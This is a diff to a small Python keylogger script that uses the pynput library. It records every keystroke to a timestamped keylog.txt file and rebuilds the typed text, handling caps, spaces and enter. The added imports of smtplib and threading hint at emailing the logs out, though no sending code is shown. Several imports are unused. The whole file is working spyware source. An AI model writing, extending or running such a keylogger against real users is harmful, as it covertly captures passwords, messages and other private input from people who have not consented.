@@ -1,12 +1,20 @@
+#!/usr/bin/python3
+
+import datetime
+from fileinput import filename
+import smtplib
+import threading
+from unittest.util import three_way_cmp
 import pynput.keyboard as keyboard
-# import threading
+import logging
 
-# import smtplib
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
-log =""
+log = ""
 caps = False
 count = 0
-def get_keys(key):
+def grab_keys(key):
+    logging.info(str(key))
     global log,caps,count
     # case = False
     try:
@@ -15,7 +23,7 @@ def get_keys(key):
             log=log+str(key.char).swapcase()
         else:
             log=log+str(key.char)
-        # log+log+str(key.char).swapcase()
+        
     
     except Exception:
         if str(key) == 'Key.space':
@@ -33,9 +41,20 @@ def get_keys(key):
             if count > 1:
                 count= 0
                 caps=False
-    print(log)
 
-listener=keyboard.Listener(on_press=get_keys)
+        elif str(key)=='Key.enter':
+            log+='\n'
+
+        elif str(key) == "Key.esc":
+            return False
+        else:
+            log+= " " + str(key)+ " "
+    prt= print (log)
+
+
+
+listener=keyboard.Listener(on_press=grab_keys)
 
 with listener:
+	
     listener.join()
